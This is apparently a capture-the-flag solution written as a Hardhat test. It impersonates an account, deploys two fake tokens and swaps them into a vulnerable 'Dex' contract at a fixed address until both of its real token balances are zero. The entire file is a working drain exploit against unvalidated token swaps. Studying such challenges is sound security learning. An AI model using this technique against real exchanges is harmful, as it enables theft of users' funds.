import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
  it("Should work", async () => {
    const attacker = await ethers.getImpersonatedSigner(process.env.ADDRESS as string);
    const dex = await ethers.getContractAt("Dex", "0xD0f6ce64ceF55e1fCE779BE23C4b96124f0497Ad");

    const token1 = await dex.token1();
    const token2 = await dex.token2();

    const BsToken = await ethers.getContractFactory("SwappableTokenTwo");

    const bsToken1 = await BsToken.connect(attacker).deploy(dex.address, "", "", "1000");
    await bsToken1.connect(attacker).transfer(dex.address, "1");
    await bsToken1.connect(attacker)["approve(address,uint256)"](dex.address, "1");
    await dex.connect(attacker).swap(bsToken1.address, token2, "1");

    const bsToken2 = await BsToken.connect(attacker).deploy(dex.address, "", "", "1000");
    await bsToken2.connect(attacker).transfer(dex.address, "1");
    await bsToken2.connect(attacker)["approve(address,uint256)"](dex.address, "1");
    await dex.connect(attacker).swap(bsToken2.address, token1, "1");

    expect((await dex.balanceOf(token1, dex.address)).isZero()).to.be.true;
    expect((await dex.balanceOf(token2, dex.address)).isZero()).to.be.true;
  })
})
